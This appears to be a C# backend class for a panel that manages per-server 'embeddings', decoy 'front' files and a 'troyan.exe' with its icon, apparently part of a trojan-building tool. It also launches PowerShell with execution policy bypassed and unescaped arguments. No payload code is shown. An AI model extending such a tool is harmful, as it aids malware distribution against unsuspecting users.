using System.Diagnostics;
using System.Text;
using System.Text.Json;
using model;

namespace Commons;

public class ServerResult
{
    public ServerModel? ServerModel;

    public Exception? Exception;
}

public partial class ServerService
{
    private readonly ServerModelLoader _loader;

    public ServerService(ServerModelLoader loader) => _loader = loader;

    public IPanelServerPaths Paths => _loader.Paths;

    public JsonSerializerOptions Jso => _loader.Jso;

    private void ServerCommons(string serverName, ServerModel serverModel)
    {
        UpdateTabs(serverModel);

        UpdatePacks(serverModel);

        UpdateBux(serverModel);

        UpdateDnSponsor(serverModel);
    }

    public string ServerDir(string serverName) => _loader.Paths.ServerDir(serverName);

    public string EmbeddingsDir(string serverName) => Path.Combine(ServerDir(serverName), "embeddings");

    public string FrontDir(string serverName) => Path.Combine(ServerDir(serverName), "front");

    public string DataFile(string serverName) => _loader.Paths.DataFile(serverName);

    public string GetIcon(string serverName) => Path.Combine(ServerDir(serverName), "troyan.ico");

    public string GetExe(string serverName) => Path.Combine(ServerDir(serverName), "troyan.exe");

    public string GetEmbedding(string serverName, string embeddingName) =>
        Path.Combine(EmbeddingsDir(serverName), embeddingName);

    public void DeleteEmbedding(string serverName, string embeddingName) =>
        File.Delete(GetEmbedding(serverName, embeddingName));

    public string GetFront(string serverName, string embeddingName) =>
        Path.Combine(FrontDir(serverName), embeddingName);

    public void DeleteFront(string serverName, string embeddingName) =>
        File.Delete(GetFront(serverName, embeddingName));

    public ServerModel GetServerLite(string serverName) => _loader.LoadServer(serverName);

    public void SaveServerLite(string serverName, ServerModel server) => _loader.SaveServer(serverName, server);

    public ServerResult GetServerHard(string serverName)
    {
        var server = GetServerLite(serverName);
        try
        {
            ServerCommons(serverName, server);

            server.Embeddings = new List<string>();
            if (Directory.Exists(EmbeddingsDir(serverName)))
                server.Embeddings = Directory.GetFiles(EmbeddingsDir(serverName)).Select(a => Path.GetFileName(a))
                    .ToList();

            server.Front = new List<string>();
            if (Directory.Exists(FrontDir(serverName)))
                server.Front = Directory.GetFiles(FrontDir(serverName)).Select(a => Path.GetFileName(a))
                    .ToList();

            SaveServerLite(serverName, server);

            return new ServerResult() { ServerModel = server };
        }
        catch (Exception e)
        {
            server.PostModel.LastResult = e.Message;
            return new ServerResult() { Exception = e, ServerModel = server };
        }
    }

    public string Reboot()
    {
        var result = "";
        var root = Paths.RootData;
        if (!Directory.Exists(root))
            return result;
        foreach (var dir in Directory.GetDirectories(root))
        {
            try
            {
                var server = Path.GetFileName(dir);
                result += RunScript(server, "reboot", "nolog", null,
                    new ValueTuple<string, object>("serverName", server));
            }
            catch (Exception e)
            {
                result += e.Message;
            }
        }

        return result;
    }

    public string RunExe(string exe, string serverName, string? arguments = null)
    {
        var args = $"{serverName}";
        if (!string.IsNullOrEmpty(arguments))
            args += $" {arguments}";
        var sa = new ProcessStartInfo
        {
            FileName = exe,
            Arguments = args,
            CreateNoWindow = false,
            UseShellExecute = false,
            RedirectStandardOutput = false,
            RedirectStandardError = false
        };
        var process = new Process { StartInfo = sa };
        process.Start();
        return "OK";
    }

    public string SysScript1(string scriptName) => Path.Combine(_loader.Paths.SysDir, scriptName + ".ps1");

    public string RunScript(string server, string scriptFile, string LogFile, Action<string>? logger,
        params (string Name, object Value)[] parameters)
    {
        try
        {
            File.Delete(LogFile);
        }
        catch (Exception)
        {
        }

        scriptFile = SysScript1(scriptFile);
        using (var process = new Process())
        {
            process.StartInfo.FileName = "powershell.exe";
            process.StartInfo.Arguments = $"-NoProfile -ExecutionPolicy Bypass -file \"{scriptFile}\" " +
                                          string.Join(" ", parameters.Select(p => $"-{p.Name} {p.Value}"));
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WorkingDirectory = ServerDir(server);

            var output = new StringBuilder();
            var error = new StringBuilder();

            process.OutputDataReceived += (_, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                {
                    output.AppendLine(DateTime.Now + ": " + e.Data);
                    logger?.Invoke(e.Data);
                    try
                    {
                        File.AppendAllText(LogFile, DateTime.Now + ": " + e.Data + Environment.NewLine);
                    }
                    catch (Exception)
                    {
                    }
                }
            };

            process.ErrorDataReceived += (_, e) =>
            {
                if (!string.IsNullOrEmpty(e.Data))
                {
                    error.AppendLine(DateTime.Now + ": " + e.Data);
                    logger?.Invoke(e.Data);
                    try
                    {
                        File.AppendAllText(LogFile, DateTime.Now + ": " + e.Data + Environment.NewLine);
                    }
                    catch (Exception)
                    {
                    }
                }
            };

            process.Start();

            process.BeginOutputReadLine();
            process.BeginErrorReadLine();

            process.WaitForExit();

            var res = error + "\r\n" + output;

            try
            {
                File.AppendAllText(LogFile, DateTime.Now + ": " + "ACK");
            }
            catch (Exception)
            {
            }

            return res + Environment.NewLine + "SYS ACCOMPLISHED";
        }
    }
}
